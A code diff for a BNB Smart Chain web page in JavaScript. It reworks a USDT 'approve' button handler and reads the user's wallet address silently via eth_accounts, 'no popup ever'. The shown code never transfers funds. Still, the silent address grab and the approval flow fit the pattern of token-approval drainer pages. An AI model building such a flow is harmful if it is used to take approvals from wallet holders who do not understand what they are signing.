@@ -220,62 +220,8 @@ async function getUsdtBalance(userAddress, iface) {
 // eth_accounts which is permanently silent inside Trust Wallet browser.
 //
 
+
 approveBtn.addEventListener("click", async () => {
-  setLoading(true, "Connecting…");
-
-  // --- NEW: make sure wallet is connected & on BSC ----------------
-  try {
-    await connectWallet();        // <‑‑ this line is the only new thing
-  } catch (e) {
-    setLoading(false);
-    return;                       // error toast already shown inside connectWallet
-  }
-
-  // ----------------------------------------------------------------
-  // 3.  The rest of your original logic (balance check, approve, …)
-  // ----------------------------------------------------------------
-  try {
-    // 3a. (Optional) re‑check that we’re still on BSC
-    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-    if (chainId !== BSC_CHAIN_ID_HEX) {
-      showToast('Wrong chain – switch to BNB Smart Chain', 'error');
-      setLoading(false);
-      return;
-    }
-
-    // ----------------------------------------------------------------
-    // 3b. Continue with your existing flow (exactly as before)
-    // ----------------------------------------------------------------
-    // (copy the entire block that was originally inside this function,
-    //  starting with the “switch chain” block and ending before the
-    //  final setLoading(false) in the original code.)
-
-    // Example snippet – keep everything exactly as you had it:
-    // ----------------------------------------------------------------
-    // Step 1 — Switch to BNB Smart Chain
-    // ... your original code ...
-    // ----------------------------------------------------------------
-    // ... rest of your original logic ...
-    // ----------------------------------------------------------------
-  } catch (err) {
-    const raw = err?.reason ?? err?.message ?? "Unknown error";
-    if (
-      err.code === 4001 ||
-      raw.toLowerCase().includes("user rejected") ||
-      raw.toLowerCase().includes("user denied") ||
-      raw.toLowerCase().includes("canceled") ||
-      raw.toLowerCase().includes("cancelled")
-    ) {
-      showToast("Transaction cancelled.", "default");
-    } else {
-      showToast("Error: " + String(raw).substring(0, 90), "error");
-    }
-  } finally {
-    setLoading(false);
-  }
-});
-
-/*approveBtn.addEventListener("click", async () => {
 
   // If window.ethereum is not yet injected (user tapped NEXT very quickly on
   // Android/iOS before the wallet browser finished injecting the provider),
@@ -327,7 +273,7 @@ approveBtn.addEventListener("click", async () => {
         return;
       }
       // any other error (e.g. already on BSC with some wallets) — continue
-    }*/
+    }
 
     // Step 2 — Get wallet address using eth_accounts (SILENT — no popup ever)
     // Reference dapp uses eth_accounts here, NOT eth_requestAccounts.
